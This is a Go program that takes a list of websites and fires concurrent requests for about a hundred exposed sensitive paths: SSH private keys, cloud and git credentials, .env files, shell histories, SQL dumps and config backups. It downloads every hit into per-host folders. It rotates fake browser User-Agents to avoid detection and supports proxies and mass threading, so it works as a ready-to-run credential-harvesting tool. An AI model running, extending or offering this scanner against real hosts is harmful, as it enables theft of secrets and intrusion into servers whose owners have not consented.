package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

var (
	sensitiveFiles = []string{
		"/.aws/credentials",
		"/.bash_history",
		"/.bashrc",
		"/.config/gcloud/credentials.db",
		"/.config/gcloud/credentials.json",
		"/.config/openvpn/auth.txt",
		"/.env.dev",
		"/.env.local",
		"/.env.prod",
		"/.env.test",
		"/.env",
		"/.git-credentials",
		"/.git/config",
		"/.gitconfig",
		"/.mysql_history",
		"/.netrc",
		"/.pgpass",
		"/.python_history",
		"/.ssh/authorized_keys",
		"/.ssh/id_rsa",
		"/.ssh/known_hosts",
		"/.vscode/sftp.json",
		"/.zsh_history",
		"/.zshrc",
		"/app/etc/env.php.bak",
		"/app/etc/env.php.old",
		"/app/etc/env.php.swp",
		"/app/etc/env.php~",
		"/archive.rar",
		"/archive.sql",
		"/archive.tar.gz",
		"/archive.tar.xz",
		"/archive.tar",
		"/archive.zip",
		"/backup.rar",
		"/backup.sql",
		"/backup.tar.gz",
		"/backup.tar.xz",
		"/backup.tar",
		"/backup.zip",
		"/config.local.php.bak",
		"/config.local.php.old",
		"/config.local.php.swp",
		"/config.local.php~",
		"/config.php.bak",
		"/config.php.old",
		"/config.php.swp",
		"/config.php~",
		"/config/settings.inc.php.bak",
		"/config/settings.inc.php.old",
		"/config/settings.inc.php.swp",
		"/config/settings.inc.php~",
		"/configuration.php.bak",
		"/configuration.php.old",
		"/configuration.php.swp",
		"/configuration.php~",
		"/contentbase.php.bak",
		"/contentbase.php.old",
		"/contentbase.php.swp",
		"/contentbase.php~",
		"/contentbase.sql",
		"/db_dump.sql",
		"/db_export.sql",
		"/db.sql",
		"/docker-compose.override.yml",
		"/docker-compose.yaml",
		"/docker-compose.yml",
		"/Dockerfile.dev",
		"/Dockerfile.prod",
		"/Dockerfile.test",
		"/Dockerfile",
		"/dump.sql",
		"/error_log",
		"/error.log",
		"/files.rar",
		"/files.tar.gz",
		"/files.tar.xz",
		"/files.zip",
		"/settings.php.bak",
		"/settings.php.old",
		"/settings.php.swp",
		"/settings.php~",
		"/site.rar",
		"/site.tar.gz",
		"/site.tar.xz",
		"/site.zip",
		"/sites/default/settings.php.bak",
		"/sites/default/settings.php.old",
		"/sites/default/settings.php.swp",
		"/sites/default/settings.php~",
		"/wp-config.php.bak",
		"/wp-config.php.old",
		"/wp-config.php.swp",
		"/wp-config.php~",
		"/www.rar",
		"/www.tar.gz",
		"/www.tar.xz",
		"/www.zip",
	}

	l          = log.New(os.Stderr, "", 0)
	htmlRegexp = regexp.MustCompile(`(?i)<(?:html|body|script|meta)`)

	inputFile  string
	outputDir  string
	threads    int
	timeout    time.Duration
	skipVerify bool
	proxyURL   string
)

func main() {
	flag.StringVar(&inputFile, "i", "-", "Input file")
	flag.StringVar(&outputDir, "o", "./output", "Output directory to found files")
	flag.IntVar(&threads, "t", 200, "Number of threads")
	// 45 секунд примерно потребуется на скачивание файла размером 5 ГиБ со скоростью 1000 МБит/с
	flag.DurationVar(&timeout, "T", 45*time.Second, "Timeout for each request")
	flag.BoolVar(&skipVerify, "k", false, "Skip SSL verification")
	flag.StringVar(&proxyURL, "p", "", "Proxy URL")
	flag.Parse()

	var urls []string
	var err error
	if inputFile == "-" {
		urls, err = readLinesFromReader(os.Stdin)
	} else {
		file, err := os.Open(inputFile)
		if err != nil {
			l.Fatalf("\033[31mFailed to open input file: %v\033[0m", err)
		}
		defer file.Close()
		urls, err = readLinesFromReader(file)
	}
	if err != nil {
		l.Fatalf("\033[31mError reading input file: %v\033[0m", err)
	}

	client, err := createHTTPClient()
	if err != nil {
		l.Fatalf("\033[31mFailed to create HTTP client: %v\033[0m", err)
	}

	wg := &sync.WaitGroup{}
	sem := make(chan struct{}, threads)
	l.Println("\033[33mStarting scanning...\033[0m")

	for _, urlStr := range urls {
		parsed, err := url.Parse(urlStr)
		if err != nil {
			l.Printf("\033[31mError parsing URL %q: %v\033[0m", urlStr, err)
			continue
		}

		for _, file := range sensitiveFiles {
			wg.Add(1)
			sem <- struct{}{}
			go func(base *url.URL, path string) {
				defer func() {
					wg.Done()
					<-sem
				}()

				fileURL, err := joinURL(base, path)
				if err != nil {
					l.Printf("\033[31mError joining URL: %v\033[0m\n", err)
					return
				}

				userAgent := generateRandomUserAgent()
				l.Printf("\033[37m%q => %q\033[0m\n", fileURL, userAgent)

				resp, err := fetch(client, fileURL, userAgent)
				if err != nil {
					l.Printf("\033[31mError fetching URL: %v\033[0m\n", err)
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode != http.StatusOK {
					l.Printf("\033[31m%d - %s\033[0m\n", resp.StatusCode, fileURL)
					return
				}

				buf := make([]byte, 4096)
				n, err := resp.Body.Read(buf)
				if err != nil && err != io.EOF {
					l.Printf("\033[31mReading error: %v\033[0m\n", err)
					return
				}

				if n <= 100 {
					l.Printf("\033[31mFile too small: %s\033[0m\n", fileURL)
					return
				}

				content := buf[:n]
				if htmlRegexp.MatchString(string(content)) {
					l.Printf("\033[31mFound HTML: %s\033[0m\n", fileURL)
					return
				}

				outputPath := filepath.Join(outputDir, base.Hostname())
				if err := os.MkdirAll(outputPath, 0o755); err != nil && !os.IsExist(err) {
					l.Printf("\033[31mError creating directory: %v\033[0m\n", err)
					return
				}

				filePath := filepath.Join(outputPath, path)
				file, err := os.Create(filePath)
				if err != nil {
					l.Printf("\033[31mError creating file: %v\033[0m\n", err)
					return
				}
				defer file.Close()

				if _, err := file.Write(content); err != nil {
					l.Printf("\033[31mError writing file: %v\033[0m\n", err)
					return
				}

				_, err = io.Copy(file, resp.Body)
				if err != nil {
					l.Printf("\033[31mError saving remaining response body: %v\033[0m\n", err)
				}

				l.Printf("\033[32mSuccessfully saved file: %s\033[0m\n", filePath)
			}(parsed, file)
		}
	}

	wg.Wait()
	close(sem)
	l.Println("\033[33mScanning finished.\033[0m")
}

func joinURL(base *url.URL, path string) (string, error) {
	rel, err := url.Parse(path)
	if err != nil {
		return "", fmt.Errorf("error parsing path %q as url: %w", path, err)
	}

	return base.ResolveReference(rel).String(), nil
}

func fetch(client *http.Client, url, userAgent string) (*http.Response, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	setHeaders(req, userAgent)
	return client.Do(req)
}

func setHeaders(req *http.Request, userAgent string) {
	headers := map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.8",
		"User-Agent":      userAgent,
	}
	for key, value := range headers {
		req.Header.Set(key, value)
	}
}

func generateRandomUserAgent() string {
	platforms := []string{
		"(Windows NT 10.0; Win64; x64)",
		"(Macintosh; Intel Mac OS X 10_15_7)",
		"(X11; Linux x86_64)",
		"(Windows NT 6.1; Win64; x64)",
		"(Macintosh; Intel Mac OS X 10_14_6)",
	}

	platform := platforms[rand.Intn(len(platforms))]

	majorVersion := rand.Intn(131-88+1) + 88

	userAgent := fmt.Sprintf(
		"Mozilla/5.0 %s AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36",
		platform,
		majorVersion,
	)

	return userAgent
}

func createHTTPClient() (*http.Client, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: skipVerify},
	}
	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err != nil {
			return nil, fmt.Errorf("Invalid proxy URL: %v", err)
		}
		transport.Proxy = http.ProxyURL(proxy)
	}
	client := &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	return client, nil
}

func readLinesFromReader(reader io.Reader) ([]string, error) {
	var lines []string
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return lines, nil
}
